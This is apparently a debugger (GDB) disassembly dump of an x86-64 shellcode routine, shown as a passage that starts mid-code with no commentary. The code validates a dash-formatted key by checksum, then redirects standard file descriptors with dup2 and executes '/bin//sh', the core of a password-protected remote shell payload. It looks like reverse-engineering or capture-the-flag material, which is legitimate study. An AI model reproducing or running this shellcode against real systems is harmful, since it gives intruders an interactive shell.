   |0x600aa2 <shellcode+98>         cmp    BYTE PTR [rsp+rcx*1],al                                                                                           │
   │0x600aa5 <shellcode+101>        je     0x600aac <shellcode+108>                                                                                          │
   │0x600aa7 <shellcode+103>        inc    rcx                                                                                                               │
   │0x600aaa <shellcode+106>        jmp    0x600aa2 <shellcode+98>                                                                                           │
   │0x600aac <shellcode+108>        cmp    rcx,0x1d                                                                                                          │
   │0x600ab0 <shellcode+112>        jne    0x600b3f <shellcode+255>                                                                                          │
   │0x600ab6 <shellcode+118>        xor    rcx,rcx                                                                                                           │
   │0x600ab9 <shellcode+121>        add    cl,0x5                                                                                                            │
   │0x600abc <shellcode+124>        cmp    BYTE PTR [rsp+rcx*1],0x2d
   |0x600ac0 <shellcode+128>        jne    0x600b3f <shellcode+255>                                                                                          │
   │0x600ac2 <shellcode+130>        add    cl,0x6                                                                                                            │
   │0x600ac5 <shellcode+133>        cmp    cl,0x11                                                                                                           │
   │0x600ac8 <shellcode+136>        jbe    0x600abc <shellcode+124>                                                                                          │
   │0x600aca <shellcode+138>        xor    rcx,rcx                                                                                                           │
   │0x600acd <shellcode+141>        mov    cl,0x1c                                                                                                           │
   │0x600acf <shellcode+143>        xor    rax,rax                                                                                                           │
   │0x600ad2 <shellcode+146>        xor    rbx,rbx
   |0x600ad5 <shellcode+149>        mov    bl,BYTE PTR [rsp+rcx*1]                                                                                           │
   │0x600ad8 <shellcode+152>        add    rax,rbx                                                                                                           │
   │0x600adb <shellcode+155>        loop   0x600ad2 <shellcode+146>                                                                                          │
   │0x600add <shellcode+157>        xor    rbx,rbx                                                                                                           │
   │0x600ae0 <shellcode+160>        mov    bl,BYTE PTR [rsp+rcx*1]                                                                                           │
   │0x600ae3 <shellcode+163>        add    rax,rbx                                                                                                           │
   │0x600ae6 <shellcode+166>        cmp    rax,0x8e0                                                                                                         │
   │0x600aec <shellcode+172>        jne    0x600b3f <shellcode+255>
   |0x600aee <shellcode+174>        lea    rdx,[rsp+0xc]    ; rdx 0x7fffffffe11c                                                                                                   │
   │0x600af3 <shellcode+179>        xor    rcx,rcx
   |0x600af6 <shellcode+182>        mov    cl,0x5                                                                                      │
   │0x600af8 <shellcode+184>        xor    rax,rax                                                                                     │
   │0x600afb <shellcode+187>        test   BYTE PTR [rdx+rcx*1],0x41                                                                   │
   │0x600aff <shellcode+191>        jne    0x600b0a <shellcode+202>                                                                    │
   │0x600b01 <shellcode+193>        test   BYTE PTR [rdx+rcx*1],0x61                                                                   │
   │0x600b05 <shellcode+197>        jne    0x600b0a <shellcode+202>                                                                    │
   │0x600b07 <shellcode+199>        inc    rax                                                                                                            │
   │0x600b0a <shellcode+202>        loop   0x600afb <shellcode+187>                                                                                          │
   │0x600b0c <shellcode+204>        test   rax,0x3                                                                                                           │
   │0x600b12 <shellcode+210>        jne    0x600b3f <shellcode+255>                                                                                          │
   │0x600b14 <shellcode+212>        xor    rax,rax                                                                                                           │
   │0x600b17 <shellcode+215>        xor    rbx,rbx                                                                                                           │
   │0x600b1a <shellcode+218>        xor    rcx,rcx                                                                                                           │
   │0x600b1d <shellcode+221>        xor    rdx,rdx                                                                                                        │
   |0x600b20 <shellcode+224>        push   0x3                               
   │0x600b22 <shellcode+226>        pop    rsi                               
   │0x600b23 <shellcode+227>        dec    esi                               
   │0x600b25 <shellcode+229>        mov    al,0x21                           
   │0x600b27 <shellcode+231>        syscall                                  
   │0x600b29 <shellcode+233>        jne    0x600b23 <shellcode+227>          
   │0x600b2b <shellcode+235>        push   rsi                               
   │0x600b2c <shellcode+236>        pop    rdx
   |0x600b2d <shellcode+237>        push   rsi                               
   │0x600b2e <shellcode+238>        movabs rbx,0x68732f2f6e69622f            
   │0x600b38 <shellcode+248>        push   rbx                               
   │0x600b39 <shellcode+249>        push   rsp                               
   │0x600b3a <shellcode+250>        pop    rdi                               
   │0x600b3b <shellcode+251>        mov    al,0x3b                           
   │0x600b3d <shellcode+253>        syscall                                  
   │0x600b3f <shellcode+255>        or     al,BYTE PTR [rax]